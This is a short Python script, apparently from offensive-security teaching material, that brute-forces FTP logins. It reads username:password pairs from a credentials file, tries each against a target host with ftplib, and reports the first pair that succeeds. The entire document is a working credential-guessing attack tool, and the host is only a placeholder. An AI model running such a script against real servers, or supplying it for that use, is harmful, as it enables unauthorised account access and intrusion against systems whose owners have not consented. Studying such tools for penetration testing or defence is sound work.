import ftplib

def bruteForceLogin(hostname, passwordFile):
    passList = open(passwordFile, 'r')
    for line in passList.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print(f"Trying: {userName}/{passWord}")
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print(f"FTP Login succeeded: {userName} + {passWord}")
            ftp.quit()
            return (userName, passWord)
        except Exception:
            pass
if __name__ == '__main__':
    hostName = "123"
    passwordFile = 'credentials.txt'
    bruteForceLogin(hostName, passwordFile)